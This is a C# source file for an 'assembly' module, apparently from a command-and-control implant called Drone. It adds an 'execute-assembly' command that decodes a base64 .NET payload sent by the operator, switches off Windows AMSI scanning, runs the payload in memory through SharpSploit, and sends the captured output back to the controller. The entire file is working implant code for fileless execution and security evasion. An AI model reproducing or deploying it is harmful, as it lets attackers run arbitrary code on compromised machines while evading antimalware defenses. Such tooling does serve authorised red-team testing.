using System;
using System.IO;
using System.Text;
using System.Threading;

using Drone.Models;

namespace Drone.Modules
{
    public class AssemblyModule : DroneModule
    {
        public override string Name { get; } = "assembly";
        
        public override void AddCommands()
        {
            var exec = new Command("execute-assembly", "Execute a .NET assembly in memory", ExecuteAssembly);
            exec.Arguments.Add(new Command.Argument("/path/to/assembly.exe", false, true));
            exec.Arguments.Add(new Command.Argument("args"));
            
            Commands.Add(exec);
        }

        private void ExecuteAssembly(DroneTask task, CancellationToken token)
        {
            var asm = Convert.FromBase64String(task.Artefact);
            var ms = new MemoryStream();
            
            var realStdOut = Console.Out;
            var realStdErr = Console.Error;
            var stdOutWriter = new StreamWriter(ms);
            var stdErrWriter = new StreamWriter(ms);
            
            stdOutWriter.AutoFlush = true;
            stdErrWriter.AutoFlush = true;
            
            Console.SetOut(stdOutWriter);
            Console.SetError(stdErrWriter);
            
            Evasion.BypassAmsi();
                
            SharpSploit.Execution.Assembly.Execute(asm, task.Arguments);
            
            Evasion.RestoreAmsi();
                
            Console.Out.Flush();
            Console.Error.Flush();
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);

            var result = Encoding.UTF8.GetString(ms.ToArray());
            ms.Dispose();
            
            Drone.SendResult(task.TaskGuid, result);
        }
    }
}